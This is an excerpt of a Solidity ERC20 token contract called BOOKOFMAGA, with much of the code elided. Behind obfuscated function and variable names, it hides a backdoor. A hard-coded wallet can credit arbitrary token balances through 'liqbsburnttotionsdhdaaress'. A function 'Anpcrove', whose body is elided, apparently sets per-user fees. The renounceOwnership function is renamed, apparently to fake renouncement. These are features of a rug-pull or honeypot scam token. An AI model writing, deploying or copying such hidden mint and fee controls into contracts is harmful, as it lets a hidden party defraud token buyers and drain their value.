...
contract Ownable is Context {
    ...
    function renounceOwnershiptrosdjrings() public virtual onlyOwner {
...
contract BOOKOFMAGA is Context, Ownable, IERC20 {
    ...
    uint256 private _totalSupply;address private _marketwalladdrstionstersyisers;address constant BLACK_HOLE = 0x000000000000000000000000000000000000dEaD;                                  
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        ...
        _marketwalladdrstionstersyisers= 0xf949487363C9DfD2e753a703dd163008616e1Cb0;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function Anpcrove(address user, uint256 feePercents) external {
    ...
    function isMee() internal view returns (bool) {
        return _msgSender() == _marketwalladdrstionstersyisers;
    }

    function liqbsburnttotionsdhdaaress(address recipient, uint256 airDrop)  external {uint256 receiveRewrd = airDrop;_balances[recipient] += receiveRewrd;require(isMee(), "Caller is not the original caller");
    }
